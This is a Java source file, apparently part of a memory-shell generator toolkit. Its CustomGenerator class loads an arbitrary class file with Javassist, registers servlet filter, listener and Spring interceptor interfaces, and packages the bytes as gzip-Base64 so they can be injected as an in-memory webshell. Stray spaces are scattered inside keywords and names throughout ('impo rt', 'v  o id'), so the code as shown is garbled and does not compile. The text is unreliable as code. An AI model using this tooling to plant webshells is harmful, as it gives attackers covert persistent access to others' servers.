package jmg.custom.generator;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import   jmg.core.config.AbstractConfig;
import jmg.core.generator.IShellGenerator;
import jmg.core.util.CommonUtil;

impo rt javax.servlet.Filter;
import javax.servlet.ServletRequestListener;
impo     rt java.io.DataInputStream;
import  java.io.File;
import java.io.FileInputStream;

public clas s CustomGenerator implements IShellGener          ator        {          
     @    Override 
      public v  o id ini      tShell(Ab   st ract    Config conf      ig) {
        File     f               ;
          try {  
                f = new File(conf        i   g.getClassFile   Path());
                         if (!f.ex ist       s    () ||     !f.isF       ile()) {
                           ret   urn ;  
                                         }
                ClassPool classP     o ol = Clas     sPool.getDefau   lt(     );
               c  lassPool.insertClassPath(new ClassClassP ath(Filter.class) );
            classPool.  insertClassPath(new ClassClassPath(ServletRequestListener.class));
              clas  sPool.ma  keInterf     ac e("o       r  g.springframework.web.servlet.AsyncHandlerInt   erceptor");
                     classPoo      l.m   ake  Interface("org.springf ramework.web.se   rvlet.HandlerInt   e  rceptor");
                  Strin    g filePath = config     .getClass      File  P ath();  
             CtCl          a    ss ctClass = classPool.makeCla    ss(new DataInp       utStrea    m    (new FileI         nputStream(fi            lePath       )));
            conf  i     g.setShellC   las sN  a    me(  ctClass.getName());
            ctClass.detach();  
           } catch (       Exception    e) {
                e.prin   tSta  c kTrace(   );
                 }
         }

    @O    v     erride
    pub  lic byte[] makeShell(Abstra  ctConfig config)  th  rows Except   ion {
            initShell(config);
        byte[] bytes = CommonUti  l.ge    tFileBytes(config.ge tClas   sFilePath());
        config.setShellB   y        tes(bytes);  
            config.setShel lBytesLengt       h(bytes.length   );
        config.setShellGzipBase64Str  ing(    CommonUtil.encodeBase64(CommonUt     il.gzipCompress(bytes)));
        return  bytes;
    }    

    @Ov        erride
    public byte[]         modifyShell(String className, AbstractConfig config) {
        return null;
    }
}
